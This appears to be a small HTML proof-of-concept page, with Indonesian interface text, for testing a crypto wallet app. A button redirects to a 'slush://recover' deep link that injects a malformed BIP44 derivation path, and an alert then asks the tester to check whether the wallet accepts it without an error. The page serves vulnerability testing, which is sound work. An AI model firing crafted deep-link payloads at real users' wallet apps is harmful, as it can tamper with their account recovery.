<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PoC | Derivation Path Manipulation</title>
    <style>
        body { background: #000; color: #ffaa00; font-family: monospace; text-align: center; padding: 50px; }
        .box { border: 2px solid #ffaa00; padding: 25px; border-radius: 12px; background: #111; display: inline-block; }
        button { background: #ffaa00; color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .log { margin-top: 15px; font-size: 12px; color: #888; }
    </style>
</head>
<body>

<div class="box">
    <h2>RECOVERY PATH TEST</h2>
    <p>Menguji validasi Derivation Path (BIP44) pada Wallet.</p>
    
    <button onclick="testPathInjection()">INJECT CORRUPT PATH</button>
    
    <div id="status" class="log">> Menunggu perintah...</div>
</div>

<script>
    function testPathInjection() {
        const out = document.getElementById('status');
        
     
        const badPath = "m/44'/60'/0'/0/invalid_index"; 
        
        out.innerText = "Attempting to inject: " + badPath; 

        
        window.location.href = `slush://recover?path=${badPath}`;

        setTimeout(() => {
            alert("AUDIT SELESAI:\nPeriksa dompet Anda. Jika aplikasi mencoba memulihkan akun menggunakan jalur '" + badPath + "' tanpa pesan error, ini adalah kerentanan integritas.");
        }, 1000);
    }
</script>

</body>
</html>
